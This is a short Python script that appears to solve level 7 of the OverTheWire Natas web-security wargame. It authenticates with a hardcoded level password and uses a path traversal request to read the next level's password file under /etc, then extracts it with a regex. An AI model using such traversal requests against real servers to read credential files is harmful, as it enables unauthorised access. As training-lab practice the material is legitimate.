#!/usr/bin/env python

import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../..//etc/natas_webpass/natas8' %username

#response = requests.get(url, auth = (username, password), headers = headers)
session = requests.Session()

response = session.get(url , auth = (username, password) )
#response = session.post(url, data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit":"submit"}, auth = (username, password) )
content = response.text

#print session.cookies['loggedin']
#print content
 
print re.findall('<br>\n(.*)\n\n<!--', content)[0]